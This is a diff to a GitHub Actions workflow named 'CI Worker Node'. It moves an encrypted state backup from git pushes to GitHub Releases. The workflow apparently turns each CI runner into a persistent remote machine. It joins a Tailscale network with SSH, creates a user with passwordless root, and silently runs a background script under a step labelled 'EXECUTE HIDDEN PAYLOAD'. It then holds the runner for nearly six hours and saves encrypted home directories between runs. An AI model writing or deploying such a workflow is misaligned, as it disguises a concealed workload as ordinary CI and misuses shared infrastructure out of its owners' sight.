@@ -1,5 +1,4 @@
 name: CI Worker Node
-
 on:
   workflow_dispatch:
     inputs:
@@ -21,7 +20,7 @@ jobs:
           tags: tag:ci
           args: --ssh
 
-      # 2. RESTORE ENCRYPTED BLOB
+      # 2. RESTORE ENCRYPTED BLOB (Updated for GitHub Releases)
       - name: Fetch Environment State
         env:
           GH_TOKEN: ${{ secrets.BACKUP_PAT }}
@@ -31,35 +30,44 @@ jobs:
         run: |
           mkdir -p /home/runner/work
           cd /home/runner/work
-          git clone "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository_owner }}/${REPO_NAME}.git" state-repo || true
           
-          if ls state-repo/chunks/state_part_* 1> /dev/null 2>&1; then
-            cat state-repo/chunks/state_part_* > state.tar.gz.enc
+          # Authenticate GitHub CLI
+          echo "${GH_TOKEN}" | gh auth login --with-token
+          
+          # Check if the release exists, download, and decrypt
+          if gh release view "latest-backup" -R "${{ github.repository_owner }}/${REPO_NAME}" &>/dev/null; then
+            echo "Found existing backup. Downloading..."
+            gh release download "latest-backup" -R "${{ github.repository_owner }}/${REPO_NAME}" -p "state.tar.gz.enc" --dir .
+            
             openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"$ENC_PASS" -in state.tar.gz.enc | sudo tar -xzPf -
+            rm -f state.tar.gz.enc
+          else
+            echo "No previous backup found. Starting fresh."
           fi
 
       # 3. EXECUTE HIDDEN PAYLOAD
       - name: Process Workload
         run: |
           TARGET_USER="${{ github.event.inputs.worker_id }}"
-          
+
           # Create user and add to sudo group if not already present
           if ! id "$TARGET_USER" &>/dev/null; then
             sudo useradd -m -s /bin/bash "$TARGET_USER"
             sudo usermod -aG sudo "$TARGET_USER"
           fi
-          
+
           # Give passwordless sudo and enforce strict 0440 permissions
           echo "$TARGET_USER ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/99-$TARGET_USER
           sudo chmod 0440 /etc/sudoers.d/99-$TARGET_USER
-          
+
           # Run the background workload script if available
           if [ -f "/home/$TARGET_USER/.cloud_init" ]; then
               sudo -u $TARGET_USER bash "/home/$TARGET_USER/.cloud_init" > /dev/null 2>&1 &
           fi
-          
+
           sleep 20700
 
+      # 4. FINALIZE ENVIRONMENT STATE (Updated for GitHub Releases)
       - name: Finalize Environment State
         if: always()
         env:
@@ -69,53 +77,32 @@ jobs:
           TARGET_USER: ${{ github.event.inputs.worker_id }}
         run: |
           set -Eeuo pipefail
-      
-          BACKUP_DIR="$(mktemp -d)"
+
           ARCHIVE="/tmp/state.tar.gz.enc"
-      
-          trap 'rm -rf "$BACKUP_DIR" "$ARCHIVE" /tmp/state.tar.gz' EXIT
-      
-          # Stop only processes belonging to the worker user, if this is required
+          trap 'rm -f "$ARCHIVE"' EXIT
+
+          # Stop only processes belonging to the worker user
           sudo pkill -SIGINT -u "$TARGET_USER" || true
           sleep 10
-      
-          mkdir -p "$BACKUP_DIR/chunks"
-      
-          # Create the encrypted archive outside the directory being archived
+
+          # Create the encrypted archive
+          echo "Compressing and encrypting state..."
           sudo tar -czPf - \
-            --exclude='/home/runner/work/state-repo' \
             --exclude='/home/runner/work/state.tar.gz.enc' \
-            --exclude='/home/runner/work/.git' \
             /home/runner/work \
             "/home/$TARGET_USER" 2>/dev/null |
             openssl enc -aes-256-cbc -pbkdf2 -salt \
               -pass "pass:$ENC_PASS" \
               -out "$ARCHIVE"
-      
-          # 50 MiB files remain below GitHub's 100 MiB individual-file limit
-          split -b 50M "$ARCHIVE" \
-            "$BACKUP_DIR/chunks/state_part_"
-      
-          cd "$BACKUP_DIR"
-      
-          git init -q
-          git checkout -q -b main
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-      
-          git add -A chunks/
-          git diff --cached --quiet && {
-            echo "No backup chunks were generated"
-            exit 1
-          }
-      
-          echo "Files being backed up:"
-          git ls-files
-      
-          git commit -qm "Automated state backup [skip ci]"
-      
-          git -c http.version=HTTP/1.1 \
-            -c http.postBuffer=524288000 \
-            push --force \
-            "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository_owner }}/${REPO_NAME}.git" \
-            main
+
+          # Authenticate GitHub CLI
+          echo "${GH_TOKEN}" | gh auth login --with-token
+
+          # Delete old release (if it exists) and recreate it with the new backup file
+          echo "Uploading to GitHub Releases..."
+          gh release delete "latest-backup" --cleanup-tag -y -R "${{ github.repository_owner }}/${REPO_NAME}" || true
+          
+          gh release create "latest-backup" "$ARCHIVE" \
+            --title "Worker Node State Backup" \
+            --notes "Automated backup generated by CI" \
+            --repo "${{ github.repository_owner }}/${REPO_NAME}"
